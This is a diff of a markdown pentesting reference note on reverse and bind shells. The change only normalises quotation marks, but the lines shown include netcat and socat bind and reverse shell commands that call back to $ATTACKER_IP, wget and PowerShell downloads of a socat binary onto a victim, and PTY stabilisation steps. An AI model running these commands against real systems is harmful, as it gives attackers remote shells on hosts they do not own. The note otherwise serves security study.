@@ -48,11 +48,11 @@ Most initial reverse shells (in particular web shells) are non-interactive.
 
 ### Netcat
 
-While binding to well-known ports requires the use of sudo, it’s also less likely to get flagged/blocked by intermediate firewalls.
+While binding to well-known ports requires the use of sudo, it's also less likely to get flagged/blocked by intermediate firewalls.
 
 ### Netcat Shell Stabilization
 
-One thing that causes a reverse shell to be non-interactive is when its running in a shell itself. It’s generally possible to stabilize these and get a fully interactive shell on UNIX-like systems:
+One thing that causes a reverse shell to be non-interactive is when its running in a shell itself. It's generally possible to stabilize these and get a fully interactive shell on UNIX-like systems:
 
 * Start an instance of bash connected to an actual PTY: `env TERM=xterm python -c 'import pty; pty.spawn("/bin/bash")'`
 * Suspend the reverse shell.
@@ -60,14 +60,14 @@ One thing that causes a reverse shell to be non-interactive is when its running 
 
 Note that the `stty` command can be canceled using `reset` (after closing the reverse shell). Since echo is turned off, typing this won't be visible. Trust the force!
 
-You can *mostly* bypass the need for the `stty` command by using `rlwrap`, which sets all of this up for you (though it doesn’t redirect control sequences, so Ctrl+C will still kill the connection).
+You can *mostly* bypass the need for the `stty` command by using `rlwrap`, which sets all of this up for you (though it doesn't redirect control sequences, so Ctrl+C will still kill the connection).
 
-It’s also possible to upgrade to a socat-powered shell, assuming that you have a statically-compiled version of socat. Typically, the way that you’d transfer this binary is by first spinning up a simply webserver in the directory with your socat binary on the attack machine, and then downloading that binary to the vicitim.
+It's also possible to upgrade to a socat-powered shell, assuming that you have a statically-compiled version of socat. Typically, the way that you'd transfer this binary is by first spinning up a simply webserver in the directory with your socat binary on the attack machine, and then downloading that binary to the vicitim.
 
 * UNIX LIKE: `wget $ATTACKER_IP/socat -O /tmp/socat`
 * WINDOWS (POWERSHELL): `Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\Windows	emp\socat.exe`
 
-NOTE that in *none* of these cases will the reverse shell pick up on your terminal size, so you’ll need to manually specify it using `stty rows` and `stty cols`.
+NOTE that in *none* of these cases will the reverse shell pick up on your terminal size, so you'll need to manually specify it using `stty rows` and `stty cols`.
 
 * [Quick-n-Dirty Python Web Server](../notes/quick-n-dirty-python-web-server.md)
 
@@ -82,7 +82,7 @@ Socat: Just an anything-to-anything connector!
 | Bind shell (attacker)    | `nc $TARGET_IP $LISTENER_PORT`              | `socat TCP:$TARGET_IP:$LISTENER_PORT`                      |
 | Bind shell (target)      | `nc -lnp $LISTENER_PORT -e /bin/bash`        | `socat TCP-LISTEN:$LISTENER_PORT EXEC:"/bin/bash -li"`      |
 
-This gets us an interactive login shell right out the gate, though we’re still vulnerable to Ctrl+C. Note that when binding to PowerShell, use `powershell.exe,pipes` in order to force PowerShell to use UNIX-style STDIN/STDOUT.
+This gets us an interactive login shell right out the gate, though we're still vulnerable to Ctrl+C. Note that when binding to PowerShell, use `powershell.exe,pipes` in order to force PowerShell to use UNIX-style STDIN/STDOUT.
 
 We can use socat to create an auto-stabilized reverse shell on UNIX-like systems (though we will still need to use `stty` to set rows/columns).
 
@@ -100,11 +100,11 @@ socat TCP-LISTEN:$LISTENER_PORT FILE:`tty`,raw,echo=0
 #     stderr - redirect STDERR to the attacker
 #     sigint - pass signals (Ctrl+C) through
 #     setsid - use a new session
-#     sane   - use a variety of tweaks to “normalize” the
-#              terminal’s environment
+#     sane   - use a variety of tweaks to "normalize" the
+#              terminal's environment
 #
 socat TCP:$ATTACKER_IP:$LISTENER_PORT \
 	EXEC:"/bin/bash -li",pty,stderr,sigint,setsid,sane
 ```
 
-NOTE that it’s perfectly acceptable to kick off a socat process from inside a netcat process!
+NOTE that it's perfectly acceptable to kick off a socat process from inside a netcat process!
